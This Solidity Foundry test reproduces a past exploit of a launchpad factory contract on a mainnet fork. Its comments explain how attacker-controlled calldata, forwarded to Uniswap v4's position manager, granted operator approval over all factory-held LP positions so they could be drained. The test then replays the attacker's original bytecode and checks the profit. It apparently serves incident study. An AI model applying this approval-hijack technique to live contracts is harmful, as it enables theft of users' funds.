// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~$17.7K (17,743.91 USDC + ~0.00721 WETH + illiquid launch memecoins)
// Attacker  : 0xc94e23C58b9b2998eDB7ABC8F99393FEaD985076
// Victim factory : 0xFB60CD0B36aD4bD839b91767a6Ad9055AB6aD825 (LaunchpadFactoryAuto)
// Helper CREATE  : 0xc7d8c70f4349acc55409800c8768e801b7556b77
// Position NFT   : 0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e (Uniswap v4 Positions)
// Attack tx : https://etherscan.io/tx/0x9583e95d5c88c7966e269197f4b09022f26b7a27ad2c13660dda6774e3136d14
// Alert     : https://x.com/DefimonAlerts/status/2085611173953540541
//
// LaunchpadFactoryAuto.launch() forwards attacker-supplied initCalldata/modifyCalldata
// into PositionManager.multicall() with the factory as msg.sender. Factory custodies
// every launch's Uniswap V4 LP NFT, so modifyCalldata = setApprovalForAll(exploit, true)
// grants the attacker operator rights over all held positions. Exploit then burns
// positions via modifyLiquidities + TAKE_PAIR and sweeps USDC/WETH/memecoins.
//
// PoC: fork one block before the attack; re-broadcast historical CREATE bytecode.

address constant ATTACKER = 0xc94e23C58b9b2998eDB7ABC8F99393FEaD985076;
address constant FACTORY = 0xFB60CD0B36aD4bD839b91767a6Ad9055AB6aD825;
address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant POS_MGR = 0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e;

// Attack mined in block 25692311
uint256 constant FORK_BLOCK = 25_692_310;
// 17,743.907229 USDC (6 decimals)
uint256 constant EXPECTED_USDC = 17_743_907_229;
// 0.007209570881911319 WETH
uint256 constant EXPECTED_WETH = 7_209_570_881_911_319;

contract UnistreetsLaunchpadFactory_exp is BaseTestWithBalanceLog {
    function setUp() public {
        string memory rpc = vm.envOr("ETH_RPC_URL", string("https://eth.llamarpc.com"));
        try vm.envString("MAINNET_RPC_URL") returns (string memory m) {
            if (bytes(m).length > 0) rpc = m;
        } catch {}
        vm.createSelectFork(rpc, FORK_BLOCK);
        fundingToken = USDC;
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        vm.label(ATTACKER, "Attacker");
        vm.label(FACTORY, "LaunchpadFactoryAuto");
        vm.label(USDC, "USDC");
        vm.label(WETH, "WETH");
        vm.label(POS_MGR, "UniswapV4PositionManager");

        string memory hexFile = vm.readFile("calldata/attack_create.hex");
        // strip trailing whitespace/newlines
        bytes memory raw = bytes(hexFile);
        uint256 end = raw.length;
        while (end > 0 && (raw[end - 1] == 0x0a || raw[end - 1] == 0x0d || raw[end - 1] == 0x20)) {
            end--;
        }
        bytes memory trimmed = new bytes(end);
        for (uint256 i = 0; i < end; i++) {
            trimmed[i] = raw[i];
        }
        bytes memory createCode = vm.parseBytes(string(trimmed));
        uint256 usdc0 = IERC20(USDC).balanceOf(ATTACKER);
        uint256 weth0 = IERC20(WETH).balanceOf(ATTACKER);

        vm.startPrank(ATTACKER, ATTACKER);
        address deployed;
        assembly {
            deployed := create(0, add(createCode, 0x20), mload(createCode))
        }
        require(deployed != address(0), "create failed");
        vm.stopPrank();

        uint256 usdcProfit = IERC20(USDC).balanceOf(ATTACKER) - usdc0;
        uint256 wethProfit = IERC20(WETH).balanceOf(ATTACKER) - weth0;
        emit log_named_address("Deployed exploit", deployed);
        emit log_named_decimal_uint("Attacker USDC profit", usdcProfit, 6);
        emit log_named_decimal_uint("Attacker WETH profit", wethProfit, 18);

        require(usdcProfit >= EXPECTED_USDC, "USDC short");
        require(wethProfit >= EXPECTED_WETH, "WETH short");
    }
}
